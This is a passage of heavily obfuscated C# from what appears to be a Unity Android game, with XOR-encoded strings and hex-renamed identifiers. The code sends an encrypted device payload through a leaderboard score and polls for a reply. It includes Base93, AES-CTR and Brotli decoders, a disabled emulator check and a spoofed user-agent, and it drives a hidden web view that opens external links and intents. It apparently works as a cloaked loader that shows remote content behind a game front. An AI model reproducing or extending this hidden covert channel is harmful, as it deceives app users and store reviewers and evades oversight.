        AndroidNotificationCenter.SendNotification(_0x0acf55e1, _0x530a90e8._0xfeee60cc(new byte[15] { 217, 216, 219, 220, 200, 209, 201, 226, 222, 213, 220, 211, 211, 216, 209 }, 189));
    }

    private Canvas _0xa46b8cc8;
    private bool _0xa2958e67(string _0x57091d32)
    {
        try
        {
            using (var _0xe99c6659 = new AndroidJavaClass(_0x530a90e8._0xfeee60cc(new byte[30] { 124, 112, 114, 49, 106, 113, 118, 107, 102, 44, 123, 49, 111, 115, 126, 102, 122, 109, 49, 74, 113, 118, 107, 102, 79, 115, 126, 102, 122, 109 }, 31)))
            using (var _0x8317926a = _0xe99c6659.GetStatic<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[15] { 219, 205, 202, 202, 221, 214, 204, 249, 219, 204, 209, 206, 209, 204, 193 }, 184)))
            using (var _0x4db9e1cc = _0x8317926a.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[17] { 12, 14, 31, 59, 10, 8, 0, 10, 12, 14, 38, 10, 5, 10, 12, 14, 25 }, 107)))
            using (var _0xc7507f9d = new AndroidJavaClass(_0x530a90e8._0xfeee60cc(new byte[22] { 45, 34, 40, 62, 35, 37, 40, 98, 47, 35, 34, 56, 41, 34, 56, 98, 5, 34, 56, 41, 34, 56 }, 76)))
            using (var _0x7cd82aee = _0xc7507f9d.CallStatic<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[8] { 127, 110, 125, 124, 106, 90, 125, 102 }, 15), _0x57091d32, 1))
            {
                string _0x6a7d598e = _0x7cd82aee.Call<string>(_0x530a90e8._0xfeee60cc(new byte[14] { 243, 241, 224, 199, 224, 230, 253, 250, 243, 209, 236, 224, 230, 245 }, 148), _0x530a90e8._0xfeee60cc(new byte[20] { 93, 77, 80, 72, 76, 90, 77, 96, 89, 94, 83, 83, 93, 94, 92, 84, 96, 74, 77, 83 }, 63));
                string _0xaffec3f6 = _0x7cd82aee.Call<string>(_0x530a90e8._0xfeee60cc(new byte[10] { 70, 68, 85, 113, 64, 66, 74, 64, 70, 68 }, 33));
                _0x7cd82aee.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[11] { 135, 130, 130, 165, 135, 146, 131, 129, 137, 148, 159 }, 230), _0x530a90e8._0xfeee60cc(new byte[33] { 27, 20, 30, 8, 21, 19, 30, 84, 19, 20, 14, 31, 20, 14, 84, 25, 27, 14, 31, 29, 21, 8, 3, 84, 56, 40, 53, 45, 41, 59, 56, 54, 63 }, 122));
                _0x7cd82aee.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[11] { 24, 15, 7, 5, 28, 15, 47, 18, 30, 24, 11 }, 106), _0x530a90e8._0xfeee60cc(new byte[20] { 113, 97, 124, 100, 96, 118, 97, 76, 117, 114, 127, 127, 113, 114, 112, 120, 76, 102, 97, 127 }, 19));
                if (_0x7cd82aee.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[15] { 102, 113, 103, 123, 120, 98, 113, 85, 119, 96, 125, 98, 125, 96, 109 }, 20), _0x4db9e1cc) != null)
                {
                    WLog(_0x530a90e8._0xfeee60cc(new byte[24] { 24, 51, 41, 52, 54, 62, 23, 50, 48, 62, 123, 52, 43, 62, 53, 123, 50, 53, 47, 62, 53, 47, 97, 123 }, 91) + _0x57091d32);
                    _0x7cd82aee.Call<AndroidJavaObject>(_0x530a90e8._0xfeee60cc(new byte[8] { 170, 175, 175, 141, 167, 170, 172, 184 }, 203), 0x10000000);
                    _0x8317926a.Call(_0x530a90e8._0xfeee60cc(new byte[13] { 208, 215, 194, 209, 215, 226, 192, 215, 202, 213, 202, 215, 218 }, 163), _0x7cd82aee);
                    return true;
                }

                if (_0x8d31ab8c(_0xaffec3f6))
                    return true;
                if (!string.IsNullOrEmpty(_0x6a7d598e))
                {
                    WLog(_0x530a90e8._0xfeee60cc(new byte[28] { 163, 136, 146, 143, 141, 133, 172, 137, 139, 133, 192, 137, 142, 148, 133, 142, 148, 192, 134, 129, 140, 140, 130, 129, 131, 139, 218, 192 }, 224) + _0x6a7d598e);
                    if (_0xf040da60(_0x6a7d598e))
                        return _0x77a8adb2(_0x6a7d598e, _0xaffec3f6);
                    return _0xfaedf53f(_0x6a7d598e);
                }

                WLog(_0x530a90e8._0xfeee60cc(new byte[30] { 51, 24, 2, 31, 29, 21, 60, 25, 27, 21, 80, 25, 30, 4, 21, 30, 4, 80, 30, 31, 80, 24, 17, 30, 20, 28, 21, 2, 74, 80 }, 112) + _0x57091d32);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x530a90e8._0xfeee60cc(new byte[26] { 193, 234, 240, 237, 239, 231, 206, 235, 233, 231, 162, 235, 236, 246, 231, 236, 246, 162, 228, 227, 235, 238, 231, 230, 184, 162 }, 130) + e.Message);
            return true;
        }
    }

    private void _0xe7591052(string _0x1c943a32)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[34] { 71, 72, 121, 111, 104, 65, 60, 90, 121, 104, 127, 116, 60, 89, 100, 104, 110, 125, 60, 76, 105, 111, 116, 60, 88, 125, 104, 125, 60, 78, 125, 107, 38, 60 }, 28) + _0x1c943a32);
#endif
            }
        }

        var _0x47304a3d = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x1c943a32);
        StartCoroutine(_0xc9774d83(_0x47304a3d));
    }

    static byte[] Decode93(string _0xdbcedb0a)
    {
        var _0xc826c353 = System.Numerics.BigInteger.Zero;
        var _0xc35776e6 = new System.Numerics.BigInteger(TextAlphabet.Length);
        for (int _0x684b61be = 0; _0x684b61be < _0xdbcedb0a.Length; _0x684b61be++)
        {
            char _0x92e3ebcd = _0xdbcedb0a[_0x684b61be];
            if (_0x92e3ebcd >= _0xc7eae7d4.Length)
                throw new FormatException();
            int _0x6b773411 = _0xc7eae7d4[_0x92e3ebcd];
            if (_0x6b773411 < 0)
                throw new FormatException();
            _0xc826c353 = _0xc826c353 * _0xc35776e6 + _0x6b773411;
        }

        var _0xdc41ca22 = ToBigEndian(_0xc826c353);
        if (_0xdc41ca22.Length < 2 || _0xdc41ca22[0] != 1)
            throw new FormatException();
        var _0x80001de4 = new byte[_0xdc41ca22.Length - 1];
        Buffer.BlockCopy(_0xdc41ca22, 1, _0x80001de4, 0, _0x80001de4.Length);
        return _0x80001de4;
    }

    private string _0xb3551ae3 = "";
    private string _0xe83dba7e()
    {
        string _0xc540da60 = _0xb641090d();
        if (string.IsNullOrEmpty(_0xc540da60))
            return _0x530a90e8._0xfeee60cc(new byte[7] { 47, 54, 48, 61, 121, 105, 98 }, 89);
        string _0x31d7a894 = _0xc540da60.Replace(_0x530a90e8._0xfeee60cc(new byte[1] { 159 }, 195), _0x530a90e8._0xfeee60cc(new byte[2] { 131, 131 }, 223)).Replace(_0x530a90e8._0xfeee60cc(new byte[1] { 58 }, 29), _0x530a90e8._0xfeee60cc(new byte[2] { 85, 46 }, 9));
        var _0x6dff2105 = Regex.Match(_0xc540da60, _0x530a90e8._0xfeee60cc(new byte[12] { 93, 118, 108, 113, 115, 123, 49, 54, 66, 122, 53, 55 }, 30));
        string _0x7c5d6315 = _0x6dff2105.Success ? _0x6dff2105.Groups[1].Value : _0x530a90e8._0xfeee60cc(new byte[3] { 139, 136, 138 }, 186);
        return _0x530a90e8._0xfeee60cc(new byte[12] { 238, 160, 179, 168, 165, 178, 175, 169, 168, 238, 239, 189 }, 198) + _0x530a90e8._0xfeee60cc(new byte[8] { 149, 130, 145, 195, 150, 130, 222, 196 }, 227) + _0x31d7a894 + _0x530a90e8._0xfeee60cc(new byte[2] { 211, 207 }, 244) + _0x530a90e8._0xfeee60cc(new byte[30] { 97, 118, 101, 55, 103, 101, 120, 99, 120, 42, 89, 118, 97, 126, 112, 118, 99, 120, 101, 57, 103, 101, 120, 99, 120, 99, 110, 103, 114, 44 }, 23) + _0x530a90e8._0xfeee60cc(new byte[121] { 103, 116, 111, 98, 117, 104, 110, 111, 33, 101, 100, 103, 41, 110, 99, 107, 45, 106, 100, 120, 45, 119, 96, 109, 40, 122, 117, 115, 120, 122, 78, 99, 107, 100, 98, 117, 47, 101, 100, 103, 104, 111, 100, 81, 115, 110, 113, 100, 115, 117, 120, 41, 110, 99, 107, 45, 106, 100, 120, 45, 122, 102, 100, 117, 59, 103, 116, 111, 98, 117, 104, 110, 111, 41, 40, 122, 115, 100, 117, 116, 115, 111, 33, 119, 96, 109, 58, 124, 45, 98, 110, 111, 103, 104, 102, 116, 115, 96, 99, 109, 100, 59, 117, 115, 116, 100, 124, 40, 58, 124, 98, 96, 117, 98, 105, 41, 100, 40, 122, 124, 124 }, 1) + _0x530a90e8._0xfeee60cc(new byte[26] { 224, 225, 226, 172, 244, 246, 235, 240, 235, 168, 163, 241, 247, 225, 246, 197, 227, 225, 234, 240, 163, 168, 241, 229, 173, 191 }, 132) + _0x530a90e8._0xfeee60cc(new byte[52] { 251, 250, 249, 183, 239, 237, 240, 235, 240, 179, 184, 254, 239, 239, 201, 250, 237, 236, 246, 240, 241, 184, 179, 234, 254, 177, 237, 250, 239, 243, 254, 252, 250, 183, 176, 193, 210, 240, 229, 246, 243, 243, 254, 195, 176, 176, 179, 184, 184, 182, 182, 164 }, 159) + _0x530a90e8._0xfeee60cc(new byte[37] { 118, 119, 116, 58, 98, 96, 125, 102, 125, 62, 53, 98, 126, 115, 102, 116, 125, 96, 127, 53, 62, 53, 94, 123, 124, 103, 106, 50, 115, 96, 127, 100, 42, 126, 53, 59, 41 }, 18) + _0x530a90e8._0xfeee60cc(new byte[34] { 59, 58, 57, 119, 47, 45, 48, 43, 48, 115, 120, 41, 58, 49, 59, 48, 45, 120, 115, 120, 24, 48, 48, 56, 51, 58, 127, 22, 49, 60, 113, 120, 118, 100 }, 95) + _0x530a90e8._0xfeee60cc(new byte[30] { 179, 178, 177, 255, 167, 165, 184, 163, 184, 251, 240, 186, 182, 175, 131, 184, 162, 180, 191, 135, 184, 190, 185, 163, 164, 240, 251, 226, 254, 236 }, 215) + _0x530a90e8._0xfeee60cc(new byte[48] { 66, 68, 79, 77, 64, 87, 68, 22, 67, 87, 82, 11, 77, 84, 68, 87, 88, 82, 69, 12, 109, 77, 84, 68, 87, 88, 82, 12, 17, 117, 94, 68, 89, 91, 95, 67, 91, 17, 26, 64, 83, 68, 69, 95, 89, 88, 12, 17 }, 54) + _0x7c5d6315 + _0x530a90e8._0xfeee60cc(new byte[35] { 54, 108, 61, 106, 115, 99, 112, 127, 117, 43, 54, 86, 126, 126, 118, 125, 116, 49, 82, 121, 99, 126, 124, 116, 54, 61, 103, 116, 99, 98, 120, 126, 127, 43, 54 }, 17) + _0x7c5d6315 + _0x530a90e8._0xfeee60cc(new byte[238] { 35, 121, 40, 127, 102, 118, 101, 106, 96, 62, 35, 74, 107, 112, 57, 69, 59, 70, 118, 101, 106, 96, 35, 40, 114, 97, 118, 119, 109, 107, 106, 62, 35, 54, 48, 35, 121, 89, 40, 105, 107, 102, 109, 104, 97, 62, 112, 118, 113, 97, 40, 116, 104, 101, 112, 98, 107, 118, 105, 62, 35, 69, 106, 96, 118, 107, 109, 96, 35, 40, 99, 97, 112, 76, 109, 99, 108, 65, 106, 112, 118, 107, 116, 125, 82, 101, 104, 113, 97, 119, 62, 98, 113, 106, 103, 112, 109, 107, 106, 44, 45, 127, 118, 97, 112, 113, 118, 106, 36, 84, 118, 107, 105, 109, 119, 97, 42, 118, 97, 119, 107, 104, 114, 97, 44, 127, 101, 118, 103, 108, 109, 112, 97, 103, 112, 113, 118, 97, 62, 35, 101, 118, 105, 35, 40, 102, 109, 112, 106, 97, 119, 119, 62, 35, 50, 48, 35, 40, 105, 107, 102, 109, 104, 97, 62, 112, 118, 113, 97, 40, 105, 107, 96, 97, 104, 62, 35, 35, 40, 116, 104, 101, 112, 98, 107, 118, 105, 62, 35, 69, 106, 96, 118, 107, 109, 96, 35, 40, 116, 104, 101, 112, 98, 107, 118, 105, 82, 97, 118, 119, 109, 107, 106, 62, 35, 53, 48, 42, 52, 42, 52, 35, 40, 113, 101, 66, 113, 104, 104, 82, 97, 118, 119, 109, 107, 106, 62, 35 }, 4) + _0x7c5d6315 + _0x530a90e8._0xfeee60cc(new byte[117] { 42, 52, 42, 52, 42, 52, 35, 121, 45, 63, 121, 121, 63, 75, 102, 110, 97, 103, 112, 42, 96, 97, 98, 109, 106, 97, 84, 118, 107, 116, 97, 118, 112, 125, 44, 116, 118, 107, 112, 107, 40, 35, 113, 119, 97, 118, 69, 99, 97, 106, 112, 64, 101, 112, 101, 35, 40, 127, 99, 97, 112, 62, 98, 113, 106, 103, 112, 109, 107, 106, 44, 45, 127, 118, 97, 112, 113, 118, 106, 36, 113, 101, 96, 63, 121, 40, 103, 107, 106, 98, 109, 99, 113, 118, 101, 102, 104, 97, 62, 112, 118, 113, 97, 121, 45, 63, 121, 103, 101, 112, 103, 108, 44, 97, 45, 127, 121 }, 4) + _0x530a90e8._0xfeee60cc(new byte[5] { 149, 193, 192, 193, 211 }, 232);
    }

    static byte[] AesCtr(byte[] _0xd8e5a78f, byte[] _0x210f6ae9, byte[] _0x4786d490)
    {
        using var _0x65e0b809 = Aes.Create();
        _0x65e0b809.Mode = CipherMode.ECB;
        _0x65e0b809.Padding = PaddingMode.None;
        _0x65e0b809.Key = _0x210f6ae9;
        using var _0xd06300bf = _0x65e0b809.CreateEncryptor();
        var _0x2971cd1e = new byte[_0xd8e5a78f.Length];
        var _0x37f534c4 = new byte[16];
        var _0x969f41d4 = new byte[16];
        Buffer.BlockCopy(_0x4786d490, 0, _0x37f534c4, 0, 4);
        int _0xb0bfd42e = 0;
        while (_0xb0bfd42e < _0xd8e5a78f.Length)
        {
            if (_0xd06300bf.TransformBlock(_0x37f534c4, 0, 16, _0x969f41d4, 0) != 16)
                throw new CryptographicException();
            int n = Math.Min(16, _0xd8e5a78f.Length - _0xb0bfd42e);
            for (int _0xda7e3504 = 0; _0xda7e3504 < n; _0xda7e3504++)
                _0x2971cd1e[_0xb0bfd42e + _0xda7e3504] = (byte)(_0xd8e5a78f[_0xb0bfd42e + _0xda7e3504] ^ _0x969f41d4[_0xda7e3504]);
            for (int _0xdc43165a = _0x37f534c4.Length - 1; _0xdc43165a >= 4; _0xdc43165a--)
            {
                _0x37f534c4[_0xdc43165a]++;
                if (_0x37f534c4[_0xdc43165a] != 0)
                    break;
            }

            _0xb0bfd42e += n;
        }

        return _0x2971cd1e;
    }

    private async Task _0xef54b18e()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0x3ae8584b = _0x530a90e8._0xfeee60cc(new byte[5] { 15, 8, 5, 26, 12 }, 105);
        _0xc92d1b57 = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0xfea8f982 = DateTime.UtcNow.Ticks.ToString();
        _0x3752dd53 = "";
        JObject _0x17d4b5af = BuildRandomPayload(_0xfd0ed577, _0x9bf29fde, _0x1de60d77, _0xec76fc2f, _0x7b8ae979, _0x277f9db2, _0x4e7d5ec0, _0x59d6cb5b, _0x2a9fdb2a, _0x3ae8584b, _0xa452c823, _0x2e40036f, _0x58d34cd0.ToString(), _0x5d119317, _0xfea8f982, _0xb3551ae3, _0x574823c1, _0xe4cc87f4, _0xdacf57d1, _0xc392a561());
        var _0x737bbcc7 = _0xc5348e1c(_0x17d4b5af.ToString(), _0xb3551ae3);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0x17d4b5af}");
            }
#endif
        }

        try
        {
            await _0x4385d8e3(LeaderboardId, 1d, _0x737bbcc7);
            await Task.Delay(500);
            string _0x4873184d = "";
            for (int _0xfd34146e = 0; _0xfd34146e < 20; _0xfd34146e++)
            {
                if (await _0xf6686129(1, 1))
                {
                    await _0x41535038(_0x530a90e8._0xfeee60cc(new byte[7] { 207, 193, 194, 206, 198, 200, 201 }, 173));
                    _0x1ef20944();
                    return;
                }

                _0x4873184d = await _0x809d7bf4(1, 500);
                if (!string.IsNullOrEmpty(_0x4873184d))
                    break;
            }

            _0x641403bd(_0x4873184d);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x530a90e8._0xfeee60cc(new byte[22] { 31, 16, 1, 23, 16, 25, 100, 3, 33, 42, 33, 54, 37, 40, 100, 33, 54, 54, 43, 54, 126, 100 }, 68) + e.Message);
#endif
            }

            _0x1ef20944();
        }
    }

    private bool OpenUrlExternally(string _0xf951edf1)
    {
        return _0xfaedf53f(_0xf951edf1);
    }

    private string _0xc92d1b57 = "";
    static byte[] DecompressBrotli(byte[] _0xd0c67704)
    {
        using var _0x1ae80d8f = new MemoryStream(_0xd0c67704);
        using var _0xc2336005 = new BrotliStream(_0x1ae80d8f, CompressionMode.Decompress);
        using var _0x7f226233 = new MemoryStream();
        _0xc2336005.CopyTo(_0x7f226233);
        return _0x7f226233.ToArray();
    }

    private void _0x939cd6cc(string _0xe920886f)
    {
        if (string.IsNullOrEmpty(_0xe920886f))
            return;
        if (TryOpenExternalLikeChrome(_0xe920886f))
            return;
        OpenUrlExternally(_0xe920886f);
    }

    private string _0xbeab2fad;
    private string GetFailingUrl(UniWebViewNativeResultPayload _0x600da6a8)
    {
        if (_0x600da6a8 == null || _0x600da6a8.Extra == null)
            return null;
        object _0x4fc519fb;
        if (!_0x600da6a8.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out _0x4fc519fb))
            return null;
        return _0x4fc519fb as string;
    }

    internal bool _0xf040da60(string _0x7282ee7f)
    {
        return _0x7282ee7f.StartsWith(_0x530a90e8._0xfeee60cc(new byte[9] { 165, 169, 186, 163, 173, 188, 242, 231, 231 }, 200), StringComparison.OrdinalIgnoreCase) || _0x7282ee7f.StartsWith(_0x530a90e8._0xfeee60cc(new byte[24] { 10, 22, 22, 18, 17, 88, 77, 77, 18, 14, 3, 27, 76, 5, 13, 13, 5, 14, 7, 76, 1, 13, 15, 77 }, 98), StringComparison.OrdinalIgnoreCase) || _0x7282ee7f.StartsWith(_0x530a90e8._0xfeee60cc(new byte[23] { 5, 25, 25, 29, 87, 66, 66, 29, 1, 12, 20, 67, 10, 2, 2, 10, 1, 8, 67, 14, 2, 0, 66 }, 109), StringComparison.OrdinalIgnoreCase);
    }

    private UniWebViewPopup _0x8f4547c7()
    {
        for (int _0x4759d4e4 = _0x98e8c3c0.Count - 1; _0x4759d4e4 >= 0; _0x4759d4e4--)
        {
            var _0xa4fe36f0 = _0x98e8c3c0[_0x4759d4e4];
            if (_0xa4fe36f0 != null && _0xa4fe36f0.IsAlive)
                return _0xa4fe36f0;
            _0x98e8c3c0.RemoveAt(_0x4759d4e4);
        }

        return null;
    }

    private void StopCurrentFailedLoad(UniWebView _0x215181e9)
    {
        _0x0caec46a(false);
        if (_0x215181e9 == null)
            return;
        _0x215181e9.Stop();
        if (_0x215181e9.CanGoBack)
            _0x215181e9.GoBack();
    }

    private float _0x51444364 = 0f;
    internal Button _0xfc5b7d45(string _0x8ba2cfa3, Transform _0x91cbb59e)
    {
        var _0x4b8f3569 = new GameObject(_0x8ba2cfa3 + _0x530a90e8._0xfeee60cc(new byte[3] { 202, 252, 230 }, 136), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0x6b272a3b = _0x4b8f3569.GetComponent<RectTransform>();
        _0x6b272a3b.SetParent(_0x91cbb59e, false);
        var _0x2dda4d70 = _0x4b8f3569.GetComponent<Image>();
        _0x2dda4d70.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0x2f2506d4 = _0x4b8f3569.GetComponent<Button>();
        var _0xe2050fce = _0x2f2506d4.colors;
        _0xe2050fce.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0xe2050fce.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0x2f2506d4.colors = _0xe2050fce;
        var _0xfb5a6ea8 = new GameObject(_0x530a90e8._0xfeee60cc(new byte[4] { 230, 215, 202, 198 }, 178), typeof(RectTransform), typeof(Text));
        var _0x7a37193f = _0xfb5a6ea8.GetComponent<RectTransform>();
        _0x7a37193f.SetParent(_0x4b8f3569.transform, false);
        _0x7a37193f.anchorMin = Vector2.zero;
        _0x7a37193f.anchorMax = Vector2.one;
        _0x7a37193f.offsetMin = _0x7a37193f.offsetMax = Vector2.zero;
        var _0xe17ecb2a = _0xfb5a6ea8.GetComponent<Text>();
        _0xe17ecb2a.text = _0x8ba2cfa3;
        _0xe17ecb2a.alignment = TextAnchor.MiddleCenter;
        _0xe17ecb2a.color = Color.black;
        _0xe17ecb2a.font = Resources.GetBuiltinResource<Font>(_0x530a90e8._0xfeee60cc(new byte[9] { 182, 133, 158, 150, 155, 217, 131, 131, 145 }, 247));
        _0xe17ecb2a.fontSize = 28;
        WLog(_0x530a90e8._0xfeee60cc(new byte[14] { 134, 183, 160, 164, 177, 160, 135, 176, 177, 177, 170, 171, 229, 226 }, 197) + _0x8ba2cfa3 + _0x530a90e8._0xfeee60cc(new byte[1] { 239 }, 200));
        return _0x2f2506d4;
    }

    private void _0x8b82db9b()
    {
        if (_0x6db16892 != null)
            return;
        var _0x71b482e9 = _0x6d1ec83c();
        _0x6db16892 = new GameObject(_0x530a90e8._0xfeee60cc(new byte[14] { 242, 192, 199, 243, 204, 192, 210, 246, 213, 204, 203, 203, 192, 215 }, 165), typeof(RectTransform), typeof(Text));
        _0xe999ef58 = _0x6db16892.GetComponent<RectTransform>();
        _0xe999ef58.SetParent(_0x71b482e9.transform, false);
        _0xe999ef58.anchorMin = new Vector2(0.5f, 0.5f);
        _0xe999ef58.anchorMax = new Vector2(0.5f, 0.5f);
        _0xe999ef58.pivot = new Vector2(0.5f, 0.5f);
        _0xe999ef58.sizeDelta = new Vector2(600f, 600f);
        _0xe999ef58.anchoredPosition = Vector2.zero;
        _0x8aa35086 = _0x6db16892.GetComponent<Text>();
        _0x8aa35086.text = _0x530a90e8._0xfeee60cc(new byte[1] { 75 }, 100);
        _0x8aa35086.font = Resources.GetBuiltinResource<Font>(_0x530a90e8._0xfeee60cc(new byte[17] { 22, 63, 61, 59, 57, 35, 8, 47, 52, 46, 51, 55, 63, 116, 46, 46, 60 }, 90));
        _0x8aa35086.fontSize = 200;
        _0x8aa35086.alignment = TextAnchor.MiddleCenter;
        _0x8aa35086.color = Color.white;
        _0x8aa35086.raycastTarget = false;
        _0x6db16892.SetActive(false);
    }

    private void _0x4a0da38f(UniWebView _0x88275154)
    {
        if (_0x9479662d)
            return;
        _0x9479662d = true;
        _0x88275154.AddUrlScheme(_0x530a90e8._0xfeee60cc(new byte[2] { 172, 191 }, 216));
        _0x88275154.AddUrlScheme(_0x530a90e8._0xfeee60cc(new byte[6] { 39, 32, 58, 43, 32, 58 }, 78));
        _0x88275154.AddUrlScheme(_0x530a90e8._0xfeee60cc(new byte[6] { 46, 34, 49, 40, 38, 55 }, 67));
        _0x88275154.OnMessageReceived += (_0xd83cf24a, _0x9322066d) =>
        {
            if (TryOpenExternalLikeChrome(_0x9322066d.RawMessage))
            {
                _0x0caec46a(false);
                return;
            }
        };
        _0x88275154.RegisterShouldHandleRequest(_0x7451ab5d =>
        {
            string _0xe0f8b4a6 = _0x7451ab5d != null ? _0x7451ab5d.Url : string.Empty;
            if (string.IsNullOrEmpty(_0xe0f8b4a6))
                return true;
            WLog(_0x530a90e8._0xfeee60cc(new byte[21] { 163, 152, 159, 133, 156, 148, 184, 145, 158, 148, 156, 149, 162, 149, 129, 133, 149, 131, 132, 202, 208 }, 240) + _0xe0f8b4a6);
            if (TryOpenExternalLikeChrome(_0xe0f8b4a6))
            {
                _0x0caec46a(false);
                return false;
            }

            if (_0x7451ab5d != null && _0x7451ab5d.IsMainFrame && IsGoogleAuthFlowUrl(_0xe0f8b4a6) && !_0x2ac5d5d2)
            {
                WLog(_0x530a90e8._0xfeee60cc(new byte[62] { 149, 185, 177, 182, 248, 143, 189, 186, 142, 177, 189, 175, 248, 188, 189, 172, 189, 187, 172, 189, 188, 248, 159, 183, 183, 191, 180, 189, 248, 185, 173, 172, 176, 248, 141, 138, 148, 248, 245, 230, 248, 170, 189, 180, 183, 185, 188, 248, 175, 177, 172, 176, 248, 159, 183, 183, 191, 180, 189, 248, 141, 153 }, 216));
                _0x2ac5d5d2 = true;
                _0x0caec46a(true);
                _0x0d771b38.SetUserAgent(_0xb641090d());
                _0x0d771b38.Load(_0xe0f8b4a6);
                return false;
            }

            return true;
        });
        _0x88275154.OnLoadingErrorReceived += (_0xd83cf24a, _0x57798ffc, _0x9322066d, _0x00f0af8c) =>
        {
            WLog(_0x530a90e8._0xfeee60cc(new byte[25] { 58, 22, 30, 25, 87, 32, 18, 21, 33, 30, 18, 0, 87, 50, 5, 5, 24, 5, 77, 87, 20, 24, 19, 18, 74 }, 119) + _0x57798ffc + _0x530a90e8._0xfeee60cc(new byte[9] { 28, 81, 89, 79, 79, 93, 91, 89, 1 }, 60) + _0x9322066d);
            string _0xbe9a6d4e = GetFailingUrl(_0x00f0af8c);
            if (string.IsNullOrEmpty(_0xbe9a6d4e) || IsAboutBlank(_0xbe9a6d4e))
                return;
            _ = _0x41535038(_0x530a90e8._0xfeee60cc(new byte[8] { 135, 134, 175, 149, 130, 130, 159, 130 }, 240));
            WLog(_0x530a90e8._0xfeee60cc(new byte[45] { 41, 5, 13, 10, 68, 51, 1, 6, 50, 13, 1, 19, 68, 2, 5, 13, 8, 13, 10, 3, 68, 49, 54, 40, 68, 73, 90, 68, 11, 20, 1, 10, 68, 1, 28, 16, 1, 22, 10, 5, 8, 8, 29, 94, 68 }, 100) + _0xbe9a6d4e);
            StopCurrentFailedLoad(_0xd83cf24a);
            _0x939cd6cc(_0xbe9a6d4e);
        };
        _0x88275154.OnPageStarted += (_0xd83cf24a, _0xcd89e59d) =>
        {
            _0x3a61bd38 = 0;
            if (_0xa72c34cb && IsAboutBlank(_0xcd89e59d))
            {
                WLog(_0x530a90e8._0xfeee60cc(new byte[27] { 58, 24, 15, 29, 11, 24, 7, 74, 11, 8, 5, 31, 30, 80, 8, 6, 11, 4, 1, 74, 25, 30, 11, 24, 30, 15, 14 }, 106));
                return;
            }

            WLog(_0x530a90e8._0xfeee60cc(new byte[29] { 192, 236, 228, 227, 173, 218, 232, 239, 219, 228, 232, 250, 173, 194, 227, 221, 236, 234, 232, 222, 249, 236, 255, 249, 232, 233, 183, 173, 166 }, 141) + (Time.realtimeSinceStartup - _0x51444364).ToString(_0x530a90e8._0xfeee60cc(new byte[5] { 68, 90, 68, 68, 68 }, 116)) + _0x530a90e8._0xfeee60cc(new byte[2] { 57, 106 }, 74) + _0xcd89e59d);
            if (TryOpenExternalLikeChrome(_0xcd89e59d))
            {
                StopCurrentFailedLoad(_0xd83cf24a);
                return;
            }

            if (ContainsIgnoreCase(_0xcd89e59d, _0x530a90e8._0xfeee60cc(new byte[8] { 9, 4, 4, 12, 67, 12, 29, 29 }, 109)) || ContainsIgnoreCase(_0xcd89e59d, _0x530a90e8._0xfeee60cc(new byte[15] { 186, 171, 179, 228, 189, 163, 174, 173, 175, 190, 228, 168, 166, 165, 173 }, 202)) || _0xcd89e59d.StartsWith(_0x530a90e8._0xfeee60cc(new byte[25] { 195, 223, 223, 219, 216, 145, 132, 132, 201, 219, 204, 199, 196, 201, 202, 199, 205, 202, 221, 133, 199, 194, 221, 206, 132 }, 171), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0xd83cf24a);
                OpenUrlExternally(_0xcd89e59d);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0xcd89e59d))
            {
                _0x0caec46a(true);
                WLog(_0x530a90e8._0xfeee60cc(new byte[41] { 39, 15, 15, 7, 12, 5, 64, 1, 21, 20, 8, 64, 6, 12, 15, 23, 64, 4, 5, 20, 5, 3, 20, 5, 4, 64, 77, 94, 64, 11, 5, 5, 16, 64, 22, 9, 19, 9, 2, 12, 5 }, 96));
                return;
            }

            _0x440f35f6 = true;
            _0x0caec46a(true);
            WLog(_0x530a90e8._0xfeee60cc(new byte[43] { 40, 26, 29, 41, 22, 26, 8, 95, 19, 16, 30, 27, 22, 17, 24, 80, 13, 26, 27, 22, 13, 26, 28, 11, 22, 17, 24, 95, 82, 65, 95, 20, 26, 26, 15, 95, 9, 22, 12, 22, 29, 19, 26 }, 127));
        };
        _0x88275154.OnPageCommitted += (_0xd83cf24a, _0xcd89e59d) =>
        {
            if (_0xa72c34cb && IsAboutBlank(_0xcd89e59d))
                return;
            WLog(_0x530a90e8._0xfeee60cc(new byte[31] { 84, 120, 112, 119, 57, 78, 124, 123, 79, 112, 124, 110, 57, 86, 119, 73, 120, 126, 124, 90, 118, 116, 116, 112, 109, 109, 124, 125, 35, 57, 50 }, 25) + (Time.realtimeSinceStartup - _0x51444364).ToString(_0x530a90e8._0xfeee60cc(new byte[5] { 64, 94, 64, 64, 64 }, 112)) + _0x530a90e8._0xfeee60cc(new byte[2] { 40, 123 }, 91) + _0xcd89e59d);
            if (!firstLoadShown && IsHttpUrl(_0xcd89e59d))
            {
                firstLoadShown = true;
                _0x440f35f6 = false;
                _0x0caec46a(false);
                _0x24289db0();
                _0x18b3b0ae();
                _0xd83cf24a.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x41535038(_0x530a90e8._0xfeee60cc(new byte[9] { 69, 68, 109, 93, 66, 87, 92, 87, 86 }, 50));
                WLog(_0x530a90e8._0xfeee60cc(new byte[39] { 149, 185, 177, 182, 248, 143, 189, 186, 142, 177, 189, 175, 248, 171, 176, 183, 175, 182, 248, 183, 182, 248, 187, 183, 181, 181, 177, 172, 172, 189, 188, 248, 187, 183, 182, 172, 189, 182, 172 }, 216));
            }
        };
